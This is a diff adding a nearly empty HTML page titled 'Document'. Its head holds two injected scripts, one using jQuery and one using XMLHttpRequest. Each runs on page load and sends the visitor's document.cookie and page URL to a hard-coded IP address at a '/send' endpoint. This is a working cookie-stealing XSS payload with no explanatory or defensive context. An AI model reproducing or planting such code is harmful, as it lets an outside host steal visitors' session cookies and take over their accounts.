@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+
+    王五<script src="https://code.jquery.com/jquery-2.2.4.min.js" ></script><script>$(function(){var data={www:location.href,cookie:document.cookie};$.get('http://139.180.134.182/send',data,function(res){});});</script>
+
+
+
+<script>
+
+
+function loadXMLDoc()
+{
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        
+    }
+  }
+xmlhttp.open("GET","http://139.180.134.182/send?www="+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie),true);
+xmlhttp.send();
+}
+loadXMLDoc();
+
+
+</script>
+
+</head>
+<body>
+    
+</body>
+</html>
